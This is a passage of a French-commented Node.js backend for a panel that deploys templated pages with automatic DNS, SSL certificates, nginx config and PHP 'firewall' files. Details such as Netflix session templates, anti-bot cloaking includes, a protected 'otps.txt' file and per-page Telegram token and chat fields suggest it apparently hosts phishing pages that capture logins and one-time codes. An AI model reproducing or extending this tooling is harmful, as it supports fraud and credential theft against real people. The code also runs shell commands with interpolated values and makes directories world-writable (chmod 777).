    `  ssl_certificate_key ${keyFile};`,
    ...sslExtra,
    ...(opts.cloudflare ? [
      `  real_ip_header CF-Connecting-IP;`,
      `  set_real_ip_from 173.245.48.0/20;`,
      `  set_real_ip_from 103.21.244.0/22;`,
      `  set_real_ip_from 103.22.200.0/22;`,
      `  set_real_ip_from 103.31.4.0/22;`,
      `  set_real_ip_from 141.101.64.0/18;`,
      `  set_real_ip_from 108.162.192.0/18;`,
      `  set_real_ip_from 190.93.240.0/20;`,
      `  set_real_ip_from 188.114.96.0/20;`,
      `  set_real_ip_from 197.234.240.0/22;`,
      `  set_real_ip_from 198.41.128.0/17;`,
      `  set_real_ip_from 162.158.0.0/15;`,
      `  set_real_ip_from 104.16.0.0/13;`,
      `  set_real_ip_from 104.24.0.0/14;`,
      `  set_real_ip_from 172.64.0.0/13;`,
      `  set_real_ip_from 131.0.72.0/22;`,
      `  set_real_ip_from 2400:cb00::/32;`,
      `  set_real_ip_from 2606:4700::/32;`,
      `  set_real_ip_from 2803:f800::/32;`,
      `  set_real_ip_from 2405:b500::/32;`,
      `  set_real_ip_from 2405:8100::/32;`,
      `  set_real_ip_from 2a06:98c0::/29;`,
      `  set_real_ip_from 2c0f:f248::/32;`,
    ] : []),
    `  root ${pageDir};`,
    `  index index.php;`,
    `  server_tokens off;`,
    `  add_header X-Frame-Options "SAMEORIGIN" always;`,
    `  add_header X-Content-Type-Options "nosniff" always;`,
    `  add_header Strict-Transport-Security "max-age=31536000" always;`,
    `  # Bloquer fichiers cachés, logs, backups`,
    `  location ~ /\\. { deny all; return 404; }`,
    `  location ~* \\.(log|sh|sql|env|bak|old|tmp)$ { deny all; return 404; }`,
    `  # Bloquer fichiers sensibles config/firewall (jamais accessibles via HTTP)`,
    `  location ~* ^/(config\\.php|firewall\\.php|firewall_config\\.php)$ { deny all; return 404; }`,
    `  # Bloquer panel interne et fichiers redirect sensibles`,
    `  location ~* ^/panel/ { deny all; return 404; }`,
    `  location ~* ^/redirect/(redirects\\.txt|otps\\.txt)$ { deny all; return 404; }`,
    `  # PHP-FPM pour tous les .php autorisés`,
    `  location ~ \\.php$ {`,
    `    include snippets/fastcgi-php.conf;`,
    `    fastcgi_pass unix:${cert.phpFpmSock};`,
    `    fastcgi_param DOCUMENT_ROOT ${pageDir};`,
    `    fastcgi_param SCRIPT_FILENAME ${pageDir}$fastcgi_script_name;`,
    `  }`,
    `  location / { try_files $uri $uri/ /index.php?$query_string; }`,
    `}`,
  ].join('\n');
  fs.writeFileSync(domainNginxConfPath(domain), lines + '\n');
}

/* ── Cloudflare Origin Certificate ──────────────────────────── */
function cfOriginCertExists(domain) {
  return fs.existsSync(path.join(CF_ORIGIN_DIR, `${domain}.pem`)) &&
         fs.existsSync(path.join(CF_ORIGIN_DIR, `${domain}.key`));
}

async function createCfOriginCert(token, domain) {
  fs.mkdirSync(CF_ORIGIN_DIR, { recursive: true });
  const keyPath = path.join(CF_ORIGIN_DIR, `${domain}.key`);
  const csrPath = `/tmp/cf-csr-${domain}.csr`;
  const pemPath = path.join(CF_ORIGIN_DIR, `${domain}.pem`);

  /* Générer clé privée RSA 2048 */
  await new Promise((resolve, reject) => {
    exec(`openssl genrsa -out ${keyPath} 2048`, (err) => err ? reject(err) : resolve());
  });
  /* Générer CSR */
  await new Promise((resolve, reject) => {
    exec(`openssl req -new -key ${keyPath} -out ${csrPath} -subj "/CN=${domain}"`, (err) => err ? reject(err) : resolve());
  });

  const csr = fs.readFileSync(csrPath, 'utf8');
  try { fs.unlinkSync(csrPath); } catch {}

  /* Appel API CF Origin CA */
  const r = await fetch('https://api.cloudflare.com/client/v4/certificates', {
    method:  'POST',
    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      hostnames:          [domain],
      requested_validity: 5475,   /* 15 ans */
      request_type:       'origin-rsa',
      csr,
    }),
  });
  const data = await r.json();
  if (!data.success) throw new Error(data.errors?.[0]?.message || 'Cloudflare Origin CA error');

  fs.writeFileSync(pemPath, data.result.certificate);
  console.log(`[cf-origin] ✓ certificat créé pour ${domain} (expire: ${data.result.expires_on})`);
  return { certPath: pemPath, keyPath };
}

function deleteCfOriginCert(domain) {
  const pemPath = path.join(CF_ORIGIN_DIR, `${domain}.pem`);
  const keyPath = path.join(CF_ORIGIN_DIR, `${domain}.key`);
  try { if (fs.existsSync(pemPath)) fs.unlinkSync(pemPath); } catch {}
  try { if (fs.existsSync(keyPath)) fs.unlinkSync(keyPath); } catch {}
  console.log(`[cf-origin/delete] ✓ fichiers supprimés pour ${domain}`);
}

function certExists(domain) {
  const certPath = `/etc/letsencrypt/live/${domain}/fullchain.pem`;
  if (!fs.existsSync(certPath)) return false;
  /* Vérifier la date d'expiration via openssl */
  return new Promise(resolve => {
    exec(`openssl x509 -enddate -noout -in ${certPath}`, (err, out) => {
      if (err) return resolve(false);
      /* out: "notAfter=Apr 30 07:00:00 2026 GMT" */
      const m = /notAfter=(.+)/.exec(out);
      if (!m) return resolve(false);
      const expires = new Date(m[1].trim());
      /* Valide si expiration > maintenant + 7 jours */
      resolve(expires > Date.now() + 7 * 86400000);
    });
  });
}

/* Activer/désactiver le proxy Cloudflare pour apex + www sur une zone */
async function setCfProxied(cfToken, zoneId, apex, proxied) {
  try {
    const existing = await cfApi(cfToken, `/zones/${zoneId}/dns_records?type=A&per_page=100`);
    const records  = existing.success ? existing.result : [];
    for (const name of [apex, `www.${apex}`]) {
      const rec = records.find(r => r.name === name);
      if (rec && rec.proxied !== proxied) {
        await cfApi(cfToken, `/zones/${zoneId}/dns_records/${rec.id}`, {
          method: 'PATCH',
          body: JSON.stringify({ proxied }),
        });
        console.log(`[certbot/cf-proxy] ✓ ${name} proxied=${proxied}`);
      }
    }
  } catch (err) {
    console.warn(`[certbot/cf-proxy] ✗ ${err.message}`);
  }
}

/* Vérifie si certbot-dns-cloudflare est disponible sur ce système */
function cfDnsPluginAvailable() {
  return new Promise(resolve => {
    exec('certbot plugins --text 2>/dev/null | grep -q dns-cloudflare', (err) => resolve(!err));
  });
}

/* runCertbot(domain, opts)
 * opts.cfToken  → string : utilise DNS-01 via Cloudflare API (aucun toggle proxy nécessaire)
 * Sans cfToken  → challenge HTTP-01 --webroot (domaines Namecheap)
 */
function runCertbot(domain, opts = {}) {
  return new Promise((resolve, reject) => {
    if (!config.certbot.email) return reject(new Error('CERTBOT_EMAIL non configuré.'));

    Promise.resolve(certExists(domain)).then(async exists => {
      if (exists) {
        console.log(`[certbot] ✓ certificat existant et valide pour ${domain} — skip`);
        return resolve();
      }

      let cmd, credsFile = null;

      if (opts.cfToken) {
        /* ── DNS-01 via Cloudflare API ────────────────────────────
           Pas besoin de désactiver le proxy, fonctionne toujours.
           Nécessite : certbot-dns-cloudflare installé sur le VPS
             sudo pip install certbot-dns-cloudflare
             ou : sudo apt install python3-certbot-dns-cloudflare  */
        const hasCfPlugin = await cfDnsPluginAvailable();
        if (hasCfPlugin) {
          credsFile = `/tmp/.cf-certbot-${domain.replace(/\./g,'-')}.ini`;
          fs.writeFileSync(credsFile, `dns_cloudflare_api_token = ${opts.cfToken}\n`, { mode: 0o600 });
          cmd = [
            'sudo /usr/bin/certbot certonly --dns-cloudflare',
            `--dns-cloudflare-credentials ${credsFile}`,
            `--dns-cloudflare-propagation-seconds 20`,
            `-d ${domain}`,
            `--non-interactive --agree-tos -m ${config.certbot.email}`,
            '--quiet',
          ].join(' ');
          console.log(`[certbot] ⏳ DNS-01 challenge via Cloudflare API pour ${domain}…`);
        } else {
          /* Plugin absent → fallback HTTP-01 avec proxy désactivé */
          console.warn(`[certbot] ⚠ certbot-dns-cloudflare absent — fallback HTTP-01 (proxy doit être désactivé)`);
          fs.mkdirSync(config.certbot.webroot, { recursive: true });
          cmd = [
            'sudo /usr/bin/certbot certonly --webroot',
            `-w ${config.certbot.webroot}`,
            `-d ${domain}`,
            `--non-interactive --agree-tos -m ${config.certbot.email}`,
            '--quiet',
          ].join(' ');
        }
      } else {
        /* ── HTTP-01 --webroot (domaines Namecheap) ────────────── */
        fs.mkdirSync(config.certbot.webroot, { recursive: true });
        cmd = [
          'sudo /usr/bin/certbot certonly --webroot',
          `-w ${config.certbot.webroot}`,
          `-d ${domain}`,
          `--non-interactive --agree-tos -m ${config.certbot.email}`,
          '--quiet',
        ].join(' ');
      }

      exec(cmd, { timeout: 180000 }, (err, _out, stderr) => {
        if (credsFile) { try { fs.unlinkSync(credsFile); } catch (_) {} }
        if (err) {
          console.error(`[certbot] ✗ ${domain}:`, stderr || err.message);
          reject(new Error(stderr || err.message));
        } else {
          console.log(`[certbot] ✓ certificat obtenu pour ${domain}`);
          resolve();
        }
      });
    });
  });
}

function deleteCertbot(domain) {
  return new Promise((resolve) => {
    exec(`sudo /usr/bin/certbot delete --cert-name ${domain} --non-interactive`, (err) => {
      if (err) console.warn(`[certbot/delete] ✗ ${domain}:`, err.message);
      else     console.log(`[certbot/delete] ✓ ${domain}`);
      resolve();
    });
  });
}

/* ═══════════════════════════════════════════════════════════════
   PAGES  (stockées dans user.pages — comme les domaines)
   ═══════════════════════════════════════════════════════════════ */

/* GET /api/pages */
app.get('/api/pages', requireAuth, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    res.json(user?.pages ?? []);
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* GET /api/pages/:pageId — polling status */
app.get('/api/pages/:pageId', requireAuth, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    const page = (user?.pages ?? []).find(p => p.id === req.params.pageId);
    if (!page) return res.status(404).json({ error: 'Page introuvable.' });
    res.json(page);
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* POST /api/pages */
app.post('/api/pages', requireAuth, validateCsrf, async (req, res) => {
  try {
    const { name, templateId, templateName, templateGradient, domainId, domain, config: cfg } = req.body;
    if (!name || !templateId) return res.status(400).json({ error: 'name et templateId requis.' });

    const user = await db.findUserById(req.session.userId);
    if (!user) return res.status(401).json({ error: 'Session invalide.' });

    const plan          = config.plans[user.plan];
    const existingPages = user.pages ?? [];
    if (!plan || (user.planExpiresAt && new Date(user.planExpiresAt) < new Date())) {
      return res.status(402).json({ error: 'Abonnement actif requis.' });
    }
    if (existingPages.length >= (plan?.pagesMax ?? 0)) {
      return res.status(402).json({
        error: `Limite atteinte : ${plan?.pagesMax} page(s) max avec le plan ${plan?.name}.`,
      });
    }

    if (!domainId) {
      return res.status(400).json({ error: 'Un domaine doit être sélectionné.' });
    }

    const domainAlreadyUsed = existingPages.some(p => p.domainId && p.domainId === domainId);
    if (domainAlreadyUsed) {
      return res.status(400).json({ error: 'Ce domaine est déjà utilisé par une autre page.' });
    }

    const DOMAIN_RE = /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$/i;
    const apex = domain
      ? (domain.startsWith('www.') ? domain.replace(/^www\./, '') : domain)
      : null;
    if (apex && !DOMAIN_RE.test(apex))
      return res.status(400).json({ error: 'Domaine invalide.' });

    /* Récupérer le schéma de la template */
    const templates    = readTemplates();
    const tpl          = templates.find(t => t.id === templateId);
    const configSchema = tpl?.configSchema || [];

    /* Construire le cfg depuis le corps de la requête */
    const pageConfig = {};
    if (configSchema.length) {
      for (const field of configSchema) {
        if (cfg && cfg[field.key] !== undefined) {
          pageConfig[field.key] = cfg[field.key];
        } else {
          pageConfig[field.key] = field.default ?? (field.type === 'toggle' ? false : '');
        }
      }
    } else {
      pageConfig.captcha  = !!(cfg?.captcha);
      pageConfig.applepay = cfg?.applepay !== false;
      pageConfig.tgToken  = cfg?.tgToken  || '';
      pageConfig.tgChatId = cfg?.tgChatId || '';
    }

    const page = {
      id:               crypto.randomUUID(),
      name:             name.trim(),
      templateId,
      templateName:     templateName || '',
      templateGradient: templateGradient || 'g-indigo',
      domainId:         domainId || null,
      domain:           apex,
      status:           apex ? 'creating' : 'online',
      slug:             name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, ''),
      createdAt:        new Date().toISOString(),
      configSchema,
      config:           pageConfig,
    };

    /* ── Déploiement fichiers ───────────────────────────────── */
    const tplDir  = path.join(TEMPLATES_DIR, templateId);
    const pageDir = path.join(PAGES_DIR, page.id);
    if (fs.existsSync(tplDir)) {
      copyDirSync(tplDir, pageDir);
      console.log(`[page/deploy] ✓ fichiers copiés → ${pageDir}`);
    } else {
      console.warn(`[page/deploy] ✗ template dir introuvable : ${tplDir}`);
    }
    fs.mkdirSync(pageDir, { recursive: true });
    const _pageFwOn = (page.firewall || {})['fw-master-toggle'] !== false;
    fs.writeFileSync(path.join(pageDir, 'config.php'), generateConfigPhp(page.config, configSchema, page.id, templateId).trimEnd() + `\n$test_mode = ${_pageFwOn ? 'false' : 'true'};\n`);
    fs.writeFileSync(path.join(pageDir, 'firewall_config.php'), generateFirewallConfigPhp(page.firewall || {}));
    fs.writeFileSync(path.join(pageDir, 'firewall.php'), generateFirewallPhp());
    deployCaptchaPhp(templateId, pageDir);
    console.log(`[page/deploy] ✓ config.php + firewall_config.php + firewall.php + captcha.php générés`);

    /* PHP-FPM tourne en user dontplay — pas de chown nécessaire */
    exec(`chmod -R 750 ${pageDir}`, (err) => {
      if (err) { console.error('[page/deploy] ✗ chmod échoué:', err.message); return; }
      console.log(`[page/deploy] ✓ chmod 750 → ${pageDir}`);
      // Rendre writable les répertoires où PHP doit écrire (logs, cache, func)
      // chmod 777/666 car PHP-FPM peut tourner sous un user différent (www-data vs dontplay)
      const writableDirs = [
        'logs', 'cache', 'func',
        'panel/logs', 'panel/func',
        'Panel/func',  // Netflix sessions.php hardcode ce chemin
        'prevents',
        'antibots',    // Netflix: dns_cache.json + monitoring logs
      ];
      for (const d of writableDirs) {
        const full = path.join(pageDir, d);
        // -R pour rendre writables AUSSI les fichiers à l'intérieur (pas juste le dossier)
        if (fs.existsSync(full)) exec(`chmod -R 777 ${full}`);
      }
    });

    /* ── Auto-point domain → serverIp ───────────────────────── */
    if (apex && domainId && config.server.serverIp) {
      const dom = (user.domains ?? []).find(d => d.id === domainId);
      if (dom) {
        try {
          const pointing = { mode: 'page', pageId: page.id, pageName: page.name, ip: config.server.serverIp };
          const updatedDomains = (user.domains ?? []).map(d =>
            d.id === domainId ? { ...d, pointing } : d
          );
          await db.updateUser(user.id, { domains: updatedDomains });
          console.log(`[page/auto-point] ✓ pointage DB ${apex} → ${config.server.serverIp}`);
        } catch (err) {
          console.error(`[page/auto-point] ✗ ${err.message}`);
        }

        /* Push DNS Namecheap si domaine NC */
        if (dom.source === 'namecheap') {
          try {
            const parts = apex.split('.');
            const tld   = parts.slice(-1)[0];
            const sld   = parts.slice(0, -1).join('.');
            await ncRequest('namecheap.domains.dns.setHosts', {
              SLD:          sld,
              TLD:          tld,
              HostName1:    '@',
              RecordType1:  'A',
              Address1:     config.server.serverIp,
              TTL1:         '300',
            });
            console.log(`[page/auto-point] ✓ NC DNS A @ → ${config.server.serverIp} pour ${apex}`);
          } catch (dnsErr) {
            console.error(`[page/auto-point] ✗ NC DNS: ${dnsErr.message}`);
          }
        }

        /* Push DNS Cloudflare si domaine CF */
        if (dom.source === 'cloudflare' && dom.zoneId) {
          try {
            const freshUser = await db.findUserById(user.id);
            const cfToken   = freshUser?.cloudflareToken;
            if (cfToken) {
              const serverIp = config.server.serverIp;
              const zoneId   = dom.zoneId;
              /* Lister les A records existants pour apex + www */
              const existing = await cfApi(cfToken, `/zones/${zoneId}/dns_records?type=A&per_page=100`);
              const records  = existing.success ? existing.result : [];

              for (const name of [apex, `www.${apex}`]) {
                const rec = records.find(r => r.name === name);
                if (rec) {
                  /* Mettre à jour si différent */
                  if (rec.content !== serverIp) {
                    await cfApi(cfToken, `/zones/${zoneId}/dns_records/${rec.id}`, {
                      method: 'PATCH',
                      body: JSON.stringify({ content: serverIp, proxied: rec.proxied }),
                    });
                    console.log(`[page/auto-point] ✓ CF DNS A ${name} mis à jour → ${serverIp}`);
                  } else {
                    console.log(`[page/auto-point] ✓ CF DNS A ${name} déjà correct`);
                  }
                } else {
                  /* Créer le record */
                  await cfApi(cfToken, `/zones/${zoneId}/dns_records`, {
                    method: 'POST',
                    body: JSON.stringify({ type: 'A', name, content: serverIp, proxied: true, ttl: 1 }),
                  });
                  console.log(`[page/auto-point] ✓ CF DNS A ${name} créé → ${serverIp}`);
                }
              }
            }
          } catch (dnsErr) {
            console.error(`[page/auto-point] ✗ CF DNS: ${dnsErr.message}`);
          }
        }
      }
    }

    /* ── nginx-map HTTP immédiat ─────────────────────────────── */
    if (apex) {
      const map = readPagesMap();
      map[apex] = pageDir;
      writePagesMap(map);

      /* Si le cert Let's Encrypt existe déjà (domaine recréé), écrire le conf SSL immédiatement */
      const leFileImmediate = `/etc/letsencrypt/live/${apex}/fullchain.pem`;
      if (fs.existsSync(leFileImmediate)) {
        const domObjImmediate = (user?.domains ?? []).find(d => d.id === domainId);
        writeDomainSslConf(apex, pageDir, { cloudflare: domObjImmediate?.source === 'cloudflare' });
        console.log(`[page/nginx] ✓ conf SSL immédiat (cert existant) pour ${apex}`);
      }

      reloadNginx();
      console.log(`[page/nginx] ✓ map mise à jour : ${apex} → ${pageDir}`);
    }

    await db.updateUser(user.id, { pages: [...existingPages, page] });
    console.log(`[page/create] ✓ "${page.name}" (${page.id}) status=${page.status} domain=${apex||'aucun'}`);

    /* Répondre immédiatement — le client affiche un loader */
    res.json({ success: true, page });

    /* ── Background : attente DNS + SSL ─────────────────────── */
    if (apex) {
      (async () => {
        try {
          const domForWait   = (user?.domains ?? []).find(d => d.id === domainId);
          const dnsWait      = domForWait?.source === 'cloudflare' ? 15000 : 30000;
          console.log(`[page/ssl] ⏳ attente propagation DNS ${dnsWait/1000}s pour ${apex} (${domForWait?.source || 'nc'})…`);
          await new Promise(r => setTimeout(r, dnsWait));

          /* ── Let's Encrypt ──────────────────────────────────── */
          /* Domaine Cloudflare → DNS-01 challenge (pas de toggle proxy)
             Domaine Namecheap  → HTTP-01 --webroot                    */
          let certbotOpts = {};
          if (domForWait?.source === 'cloudflare' && domForWait?.zoneId) {
            const freshUserCert = await db.findUserById(user.id);
            const cfToken = freshUserCert?.cloudflareToken;
            if (cfToken) certbotOpts.cfToken = cfToken;
          }
          await runCertbot(apex, certbotOpts);
          const leFile = `/etc/letsencrypt/live/${apex}/fullchain.pem`;
          if (fs.existsSync(leFile)) {
            const freshUser2 = await db.findUserById(user.id);
            const domObj     = (freshUser2?.domains ?? []).find(d => d.id === domainId);
            writeDomainSslConf(apex, pageDir, { cloudflare: domObj?.source === 'cloudflare' });
            reloadNginx();
            console.log(`[page/ssl] ✓ HTTPS Let's Encrypt pour ${apex}`);
          }
        } catch (err) {
          console.error(`[page/ssl] ✗ SSL échoué : ${err.message}`);
        } finally {
          const freshUser = await db.findUserById(user.id);
          const updatedPages = (freshUser?.pages ?? []).map(p =>
            p.id === page.id ? { ...p, status: 'online' } : p
          );
          await db.updateUser(user.id, { pages: updatedPages });
          console.log(`[page/ssl] ✓ page "${page.name}" → online`);
        }
      })();
    }
  } catch (err) {
    console.error('[pages/create]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* DELETE /api/pages/:pageId */
app.delete('/api/pages/:pageId', requireAuth, validateCsrf, async (req, res) => {
  try {
    const user   = await db.findUserById(req.session.userId);
    const pageId = req.params.pageId;
    const page   = (user?.pages ?? []).find(p => p.id === pageId);
    const pages  = (user?.pages ?? []).filter(p => p.id !== pageId);
    await db.updateUser(user.id, { pages });

    /* Supprimer fichiers déployés */
    const pageDir = path.join(PAGES_DIR, pageId);
    if (fs.existsSync(pageDir)) {
      fs.rmSync(pageDir, { recursive: true, force: true });
      console.log(`[page/delete] ✓ dossier supprimé : ${pageDir}`);
    }

    /* Retirer du nginx-map + supprimer conf nginx du domaine */
    if (page?.domain) {
      const apex = page.domain.replace(/^www\./, '');
      const map  = readPagesMap();
      delete map[apex];
      delete map[`www.${apex}`];
      writePagesMap(map);

      /* Supprimer le fichier .conf nginx du domaine (le cert Let's Encrypt reste intact) */
      const nginxConf = domainNginxConfPath(apex);
      if (fs.existsSync(nginxConf)) {
        try {
          fs.unlinkSync(nginxConf);
          console.log(`[page/delete] ✓ nginx conf supprimé : ${nginxConf}`);
        } catch (e) {
          console.error(`[page/delete] ✗ impossible de supprimer nginx conf : ${e.message}`);
        }
      }

      reloadNginx();
      console.log(`[page/delete] ✓ nginx-map retiré pour ${apex} — cert conservé`);

      /* ── Nettoyage DNS ────────────────────────────────────────── */
      const certPath = `/etc/letsencrypt/live/${apex}/fullchain.pem`;
      const hasCert  = fs.existsSync(certPath);
      if (hasCert) {
        console.log(`[page/delete] cert conservé (certbot) : ${certPath}`);
      }

      /* Trouver le domaine lié à cette page */
      const domainObj = (user?.domains ?? []).find(d =>
        d.id === page.domainId ||
        d.name === apex ||
        d.name === `www.${apex}`
      );

      if (domainObj) {
        /* ── Namecheap : vider les A records ───────────────────── */
        if (domainObj.source === 'namecheap') {
          try {
            const parts = domainObj.name.split('.');
            const tld   = parts.slice(-1)[0];
            const sld   = parts.slice(0, -1).join('.');
            /* getHosts d'abord pour filtrer seulement nos A records */
            const hostsXml = await ncRequest('namecheap.domains.dns.getHosts', { SLD: sld, TLD: tld });
            /* Parser les hosts existants, exclure les A records pointant vers notre IP */
            const serverIp = config.server?.serverIp;
            const hostNodes = [];
            let hostIdx = 1;
            const hostMatches = hostsXml.matchAll(/<host\s[^>]*>/gi);
            for (const m of hostMatches) {
              const tag   = m[0];
              const gAttr = attr => { const r = tag.match(new RegExp(`${attr}="([^"]*)"`,'i')); return r?.[1] ?? ''; };
              const type  = gAttr('type');
              const addr  = gAttr('address');
              const name  = gAttr('name');
              const ttl   = gAttr('ttl') || '1800';
              /* Conserver tout sauf les A records vers notre IP */
              if (type === 'A' && serverIp && addr === serverIp) continue;
              /* Conserver aussi les MX/CNAME/TXT/etc. */
              hostNodes.push({ name, type, addr, ttl, idx: hostIdx++ });
            }
            /* Réécrire les hosts sans notre A record */
            const setParams = { SLD: sld, TLD: tld };
            for (const h of hostNodes) {
              setParams[`HostName${h.idx}`]   = h.name;
              setParams[`RecordType${h.idx}`] = h.type;
              setParams[`Address${h.idx}`]    = h.addr;
              setParams[`TTL${h.idx}`]        = h.ttl;
            }
            await ncRequest('namecheap.domains.dns.setHosts', setParams);
            console.log(`[page/delete] ✓ DNS Namecheap nettoyé pour ${domainObj.name}`);
          } catch (dnsErr) {
            console.error(`[page/delete] ✗ DNS Namecheap échoué: ${dnsErr.message}`);
          }

        /* ── Cloudflare : supprimer les A records ──────────────── */
        } else if (domainObj.source === 'cloudflare' && domainObj.zoneId && user?.cloudflareToken) {
          try {
            const serverIp = config.server?.serverIp;
            const zoneId   = domainObj.zoneId;
            /* Lister les A records de la zone */
            const listData = await cfApi(user.cloudflareToken,
              `/zones/${zoneId}/dns_records?type=A&per_page=100`);
            if (listData.success && Array.isArray(listData.result)) {
              const toDelete = listData.result.filter(r =>
                /* Supprimer les A records pointant vers notre IP, sur apex + www */
                r.type === 'A' &&
                (serverIp ? r.content === serverIp : true) &&
                (r.name === apex || r.name === `www.${apex}` || r.name === domainObj.name)
              );
              for (const rec of toDelete) {
                const del = await cfApi(user.cloudflareToken,
                  `/zones/${zoneId}/dns_records/${rec.id}`, { method: 'DELETE' });
                if (del.success) {
                  console.log(`[page/delete] ✓ CF DNS supprimé : ${rec.name} A ${rec.content}`);
                } else {
                  console.error(`[page/delete] ✗ CF DNS delete échoué : ${JSON.stringify(del.errors)}`);
                }
              }
            }
          } catch (dnsErr) {
            console.error(`[page/delete] ✗ DNS Cloudflare échoué: ${dnsErr.message}`);
          }
        }

        /* Mettre à jour pointing du domaine → none */
        try {
          const domains = (user?.domains ?? []).map(d =>
            d.id === domainObj.id
              ? { ...d, pointing: { mode: 'none', ip: null, redirectUrl: null, redirectType: '301', pageId: null, pageName: null } }
              : d
          );
          await db.updateUser(user.id, { domains });
        } catch (dbErr) {
          console.error(`[page/delete] ✗ pointing reset échoué: ${dbErr.message}`);
        }
      }
    }

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* PATCH /api/pages/:pageId/firewall */
app.patch('/api/pages/:pageId/firewall', requireAuth, validateCsrf, async (req, res) => {
  try {
    const { firewall } = req.body;
    if (!firewall || typeof firewall !== 'object') return res.status(400).json({ error: 'firewall requis.' });
    const user  = await db.findUserById(req.session.userId);
    if (!user) return res.status(401).json({ error: 'Session invalide.' });
    const pageId = req.params.pageId;
    const pages  = (user?.pages ?? []).map(p => p.id === pageId ? { ...p, firewall } : p);
    await db.updateUser(user.id, { pages });
    const pageDir = path.join(PAGES_DIR, pageId);
    if (fs.existsSync(pageDir)) {
      fs.writeFileSync(path.join(pageDir, 'firewall_config.php'), generateFirewallConfigPhp(firewall));

      // Régénérer config.php avec $test_mode basé sur fw-master-toggle
      const _page      = (user?.pages ?? []).find(p => p.id === pageId);
      if (_page) {
        const tpls      = readTemplates();
        const schema    = (tpls.find(t => t.id === _page.templateId)?.configSchema) || [];
        const fwOn      = firewall['fw-master-toggle'] !== false;
        const base      = generateConfigPhp(_page.config || {}, schema, pageId, _page.templateId);
        fs.writeFileSync(path.join(pageDir, 'config.php'), base.trimEnd() + `\n$test_mode = ${fwOn ? 'false' : 'true'};\n`);
      }

      // Mettre à jour firewall.php + captcha.php + redirect/
      fs.writeFileSync(path.join(pageDir, 'firewall.php'), generateFirewallPhp());
      deployCaptchaPhp(_page?.templateId, pageDir);
      deployRedirectFiles(_page?.templateId, pageDir);

      // Patch common/includes.php pour que anti-bot soit conditionnel
      const includesPath = path.join(pageDir, 'common', 'includes.php');
      if (fs.existsSync(includesPath)) {
        fs.writeFileSync(includesPath, `<?php
http_response_code(404);

function includeAllAntiFiles($baseDir) {
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($baseDir, FilesystemIterator::SKIP_DOTS)
    );
    foreach ($iterator as $file) {
        if ($file->isFile() && preg_match('#/prevents/anti\\d+\\.php$#', str_replace('\\\\', '/', $file->getPathname()))) {
            include_once $file->getPathname();
        }
    }
}

$_dir    = dirname(__DIR__);
$_fw_cfg = $_dir . '/firewall_config.php';
if (file_exists($_fw_cfg)) include_once $_fw_cfg;

$_run_anti = isset($anti_bot_enabled) && $anti_bot_enabled
          && !(isset($test_mode) && $test_mode);
if ($_run_anti) {
    includeAllAntiFiles($_dir);
}
`);
      }

    }
    console.log(`[page/firewall] ✓ sauvegardé + config.php ($test_mode) + firewall_config.php pour ${pageId}`);
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* PATCH /api/pages/:pageId/status — toggle online/offline */
app.patch('/api/pages/:pageId/status', requireAuth, validateCsrf, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    const page = (user?.pages ?? []).find(p => p.id === req.params.pageId);
    if (!page) return res.status(404).json({ error: 'Page introuvable.' });
    if (page.status === 'creating') return res.status(400).json({ error: 'Page en cours de création.' });

    const newStatus = page.status === 'online' ? 'offline' : 'online';
    const pages = (user.pages).map(p =>
      p.id === req.params.pageId ? { ...p, status: newStatus } : p
    );
    await db.updateUser(user.id, { pages });

    /* Écrire $page_offline dans config.php → firewall.php bloque l'accès */
    const pageDir    = path.join(PAGES_DIR, page.id);
    const configPath = path.join(pageDir, 'config.php');
    if (fs.existsSync(configPath)) {
      let cfg = fs.readFileSync(configPath, 'utf8');
      cfg = cfg.replace(/\n?\$page_offline\s*=\s*(true|false);\n?/g, '');
      cfg = cfg.trimEnd() + `\n$page_offline = ${newStatus === 'offline' ? 'true' : 'false'};\n`;
      fs.writeFileSync(configPath, cfg);
    }

    /* Mettre à jour le nginx-map si la page a un domaine */
    if (page.domain) {
      const apex = page.domain.replace(/^www\./, '');
      const map  = readPagesMap();
      if (newStatus === 'online') {
        map[apex] = pageDir;
      } else {
        delete map[apex];
        delete map[`www.${apex}`];
      }
      writePagesMap(map);
      reloadNginx();
    }

    res.json({ success: true, status: newStatus });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* PATCH /api/pages/:pageId/settings */
app.patch('/api/pages/:pageId/settings', requireAuth, validateCsrf, async (req, res) => {
  try {
    const { name, config: cfg } = req.body;
    const user   = await db.findUserById(req.session.userId);
    const pageId = req.params.pageId;
    let updatedPage = null;
    const pages = (user?.pages ?? []).map(p => {
      if (p.id !== pageId) return p;
      const updated = { ...p };
      if (name) {
        updated.name = name.trim();
        updated.slug = name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
      }
      if (cfg) updated.config = { ...p.config, ...cfg };
      updatedPage = updated;
      return updated;
    });
    await db.updateUser(user.id, { pages });

    /* Régénérer config.php si config changée */
    if (cfg && updatedPage) {
      const pageDir = path.join(PAGES_DIR, pageId);
      if (fs.existsSync(pageDir)) {
        // Toujours utiliser le schema actuel du template (pas le schema obsolète stocké sur la page)
        const tpls      = readTemplates();
        const liveSchema = (tpls.find(t => t.id === updatedPage.templateId)?.configSchema) || updatedPage.configSchema || [];
        const _settFwOn = (updatedPage.firewall || {})['fw-master-toggle'] !== false;
        fs.writeFileSync(path.join(pageDir, 'config.php'), generateConfigPhp(updatedPage.config, liveSchema, pageId, updatedPage.templateId).trimEnd() + `\n$test_mode = ${_settFwOn ? 'false' : 'true'};\n`);
        deployCaptchaPhp(updatedPage.templateId, pageDir);
        deployRedirectFiles(updatedPage.templateId, pageDir);
        console.log(`[page/settings] ✓ config.php + captcha.php + redirect/ régénérés pour ${pageId}`);
      }
    }

    res.json({ success: true });
